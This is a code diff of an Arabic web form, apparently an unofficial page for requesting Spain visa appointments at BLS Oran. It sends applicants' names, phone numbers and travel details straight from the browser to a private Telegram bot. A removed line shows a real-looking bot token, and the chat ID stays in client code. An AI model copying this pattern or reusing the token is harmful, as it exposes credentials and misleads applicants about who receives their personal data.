@@ -3,48 +3,51 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>التسجيل - BLS Oran</title>
+<title>حجز موعد فيزا اسبانيا - ORAN 3</title>
 <style>
-body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px}
-.container{max-width:500px;margin:auto;background:white;padding:25px;border-radius:15px;box-shadow:0 2px 10px #ccc}
-h2{text-align:center;color:#1a7a3a}
-label{font-weight:bold;display:block;margin-top:15px}
+body{font-family:Arial;background:#0a2a4a;margin:0;padding:20px;color:#fff}
+.container{max-width:500px;margin:auto;background:#fff;color:#000;padding:25px;border-radius:15px}
+h2{text-align:center;color:#c0392b}
+label{font-weight:bold;display:block;margin-top:12px}
 input,select{width:100%;padding:12px;margin-top:5px;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
-button{width:100%;padding:13px;margin-top:20px;background:#1a7a3a;color:white;border:none;border-radius:8px;font-size:16px;font-weight:bold}
+button{width:100%;padding:14px;margin-top:20px;background:#c0392b;color:white;border:none;border-radius:8px;font-size:17px;font-weight:bold;cursor:pointer}
 #msg{text-align:center;margin-top:15px;font-weight:bold}
+.info{background:#fff3cd;padding:12px;border-radius:8px;margin-top:15px;font-size:13px}
 </style>
 </head>
 <body>
 <div class="container">
-<h2>تسجيل جديد - BLS Oran</h2>
+<h2>🇪🇸 طلب موعد فيزا اسبانيا</h2>
+<p style="text-align:center">مركز BLS وهران - ORAN 3</p>
 <form id="form">
-<label>الاسم الكامل</label>
+<label>الاسم و اللقب (كما في الباسبور)</label>
 <input type="text" id="name" required>
 <label>رقم الهاتف</label>
 <input type="tel" id="phone" required>
 <label>الولاية</label>
-<input type="text" id="wilaya" value="Oran" required>
-<label>البلدية</label>
-<input type="text" id="commune" required>
-<button type="submit">إرسال التسجيل</button>
+<select id="wilaya"><option>Chlef</option><option>Oran</option><option>Tiaret</option><option>Mostaganem</option><option>Tlemcen</option><option>Relizane</option><option>Saida</option><option>Mascara</option></select>
+<label>الفئة</label>
+<select id="cat"><option>ORAN 3</option><option>ORAN 1</option><option>ORAN 2</option><option>ORAN 4</option></select>
+<label>نوع الفيزا</label>
+<select id="type"><option>Tourisme - سياحة</option><option>Visite familiale - زيارة عائلية</option><option>Affaires - عمل</option></select>
+<label>تاريخ السفر المتوقع</label>
+<input type="date" id="date" required>
+<button type="submit">اطلب الموعد - شدلي النهار والوقت</button>
 </form>
 <div id="msg"></div>
+<div class="info">⚠️ الملف: باسبور + فيزا اسبانية قديمة + حجز طيران + تأمين + كشف حساب 3 أشهر. المواعيد تفتح الجمعة 16:00 و الثلاثاء 17:00</div>
 </div>
 <script>
-const TOKEN = "8810366366:AAFqb3wl6bCkYCrrsNJGSuABwRYD9VjZhRc";
+const TOKEN = "حط التوكن الجديد هنا";
 const CHAT_ID = "6002024244";
 document.getElementById('form').addEventListener('submit', async function(e){
 e.preventDefault();
-let name=document.getElementById('name').value;
-let phone=document.getElementById('phone').value;
-let wilaya=document.getElementById('wilaya').value;
-let commune=document.getElementById('commune').value;
-let text=`تسجيل جديد:\nالاسم: ${name}\nالهاتف: ${phone}\nالولاية: ${wilaya}\nالبلدية: ${commune}`;
+let text = `طلب موعد جديد - ORAN 3:\nالاسم: ${document.getElementById('name').value}\nالهاتف: ${document.getElementById('phone').value}\nالولاية: ${document.getElementById('wilaya').value}\nالفئة: ${document.getElementById('cat').value}\nالنوع: ${document.getElementById('type').value}\nتاريخ السفر: ${document.getElementById('date').value}`;
 document.getElementById('msg').innerText="جاري الإرسال...";
 try{
-let res=await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:text})});
-if(res.ok){document.getElementById('msg').innerText="تم التسجيل بنجاح ✅";document.getElementById('msg').style.color="green";}
-else{document.getElementById('msg').innerText="خطأ في الإرسال";}}
+let res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:text})});
+if(res.ok){document.getElementById('msg').innerText="تم استلام طلبك ✅ راح نعيطولك";document.getElementById('msg').style.color="green";}
+else{document.getElementById('msg').innerText="خطأ - عاود";}}
 catch(err){document.getElementById('msg').innerText="خطأ في الاتصال";}
 });
 </script>
